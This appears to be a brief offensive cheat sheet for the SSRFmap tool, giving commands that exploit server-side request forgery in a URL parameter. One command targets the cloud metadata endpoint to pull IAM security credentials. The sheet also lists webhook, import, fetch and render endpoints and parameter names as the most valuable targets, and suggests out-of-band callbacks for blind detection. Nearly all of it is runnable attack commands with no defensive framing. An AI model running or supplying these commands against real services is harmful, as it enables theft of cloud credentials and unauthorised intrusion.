# SSRFmap — Advanced Techniques

## From URL with FUZZ Parameter
```bash
ssrfmap -u "http://target.com/api?url=FUZZ" -m read
```

## Target Cloud Metadata (Highest Value)
```bash
ssrfmap -u "http://target.com/api?url=FUZZ" -m read \
  --lhost 169.254.169.254 \
  --lpath /latest/meta-data/iam/security-credentials/
```

## Highest Value SSRF Endpoints to Target
- `/api/webhooks` — webhook URL fields
- `/api/callbacks` — callback URL parameters
- `/api/import` — import from URL
- `/api/fetch` — URL fetcher
- `/api/preview` — URL preview/screenshot
- `/api/render` — HTML/PDF rendering from URL
- Any parameter named: `url`, `uri`, `src`, `dest`, `redirect`, `callback`, `webhook`

## Blind SSRF Detection
Use interactsh or Burp Collaborator URL as payload. DNS callback confirms SSRF even without response read.

## With Proxy (Burp Intercept)
```bash
ssrfmap -u "http://target.com/api?url=FUZZ" -m read --proxy http://127.0.0.1:8080
```
